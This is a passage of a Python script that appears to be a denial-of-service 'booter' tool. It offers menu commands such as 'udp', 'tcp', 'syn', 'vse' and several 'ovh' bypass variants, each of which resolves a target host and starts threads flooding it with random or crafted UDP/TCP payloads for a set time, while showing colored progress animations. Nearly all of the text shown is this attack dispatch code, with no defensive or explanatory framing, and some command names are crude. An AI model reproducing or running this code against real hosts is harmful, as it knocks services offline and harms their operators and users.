					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpn":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhx":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhrape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslump":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[\] Exopus Generation Attack..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[|] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack....")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[+] Exopus Generation Attack...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[/] Exopus Generation Attack.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[INFO] Floading Sent Successfully")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 655502
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[\] Exopus Generation Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[|] Exopus Generation Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[/] Exopus Generation Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[+] Exopus Generation Attack...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[/] Exopus Generation Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 655502
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 66890
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 88291
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 2000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 88345
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
